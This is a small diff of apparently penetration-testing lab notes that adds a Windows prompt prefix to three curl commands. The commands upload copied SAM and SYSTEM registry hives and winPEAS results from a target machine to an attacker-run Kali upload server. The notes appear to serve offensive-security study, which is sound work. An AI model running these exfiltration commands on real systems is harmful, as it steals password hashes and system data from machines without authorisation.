@@ -296,9 +296,9 @@ Kali port:
     pipx run uploadserver --directory /home/kali/uploads 8008
 
     --target terminal
-    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
-    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
-    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
+    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
+    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
+    C:\Users\dave>curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
     ```
   - **C:\Windows\System32\config\SAM**
   - **C:\Windows\System32\config\SYSTEM**
